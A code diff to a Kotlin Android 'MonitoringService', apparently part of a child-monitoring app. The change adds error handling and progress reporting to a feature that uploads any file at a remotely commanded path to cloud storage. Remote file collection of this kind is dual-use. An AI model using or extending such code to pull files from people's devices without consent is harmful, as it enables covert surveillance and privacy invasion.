@@ -28,7 +28,7 @@ import android.os.Looper
 import android.os.PowerManager
 import android.provider.Settings
 import android.util.Base64
-import android.widget.Toast
+import android.util.Log
 import androidx.core.app.ActivityCompat
 import androidx.core.app.NotificationCompat
 import com.google.android.gms.location.LocationServices
@@ -50,7 +50,7 @@ class MonitoringService : Service() {
     private val statusUpdater = object : Runnable {
         override fun run() {
             updateLiveStatus()
-            handler.postDelayed(this, 30000) // Actualizar cada 30 segundos
+            handler.postDelayed(this, 30000)
         }
     }
 
@@ -58,6 +58,7 @@ class MonitoringService : Service() {
     override fun onCreate() {
         super.onCreate()
         childId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+        Log.d("MonitoringService", "Servicio iniciado para el dispositivo: $childId")
         
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
             startForeground(
@@ -84,7 +85,6 @@ class MonitoringService : Service() {
                     "UPLOAD_FILE" -> uploadFileToStorage(path)
                 }
             }
-
             override fun onCancelled(error: DatabaseError) {}
         })
     }
@@ -205,16 +205,29 @@ class MonitoringService : Service() {
 
     private fun uploadFileToStorage(path: String) {
         val file = File(path)
-        if (!file.exists() || file.isDirectory) return
+        if (!file.exists() || file.isDirectory) {
+            database.child("file_ready").child(childId).setValue(mapOf(
+                "name" to (if (file.isDirectory) file.name else "Archivo no encontrado"),
+                "status" to "error",
+                "message" to "El elemento no es un archivo válido",
+                "timestamp" to System.currentTimeMillis()
+            ))
+            return
+        }
 
         val storageRef = storage.child("transfers/$childId/${file.name}")
+        val uploadTask = storageRef.putFile(Uri.fromFile(file))
 
-        storageRef.putFile(Uri.fromFile(file)).addOnSuccessListener {
+        uploadTask.addOnProgressListener { taskSnapshot ->
+            val progress = (100.0 * taskSnapshot.bytesTransferred / taskSnapshot.totalByteCount).toInt()
+            database.child("file_ready").child(childId).child("progress").setValue(progress)
+        }.addOnSuccessListener {
             storageRef.downloadUrl.addOnSuccessListener { url ->
                 database.child("file_ready").child(childId).setValue(mapOf(
                     "name" to file.name,
                     "url" to url.toString(),
                     "status" to "success",
+                    "progress" to 100,
                     "timestamp" to System.currentTimeMillis()
                 ))
             }
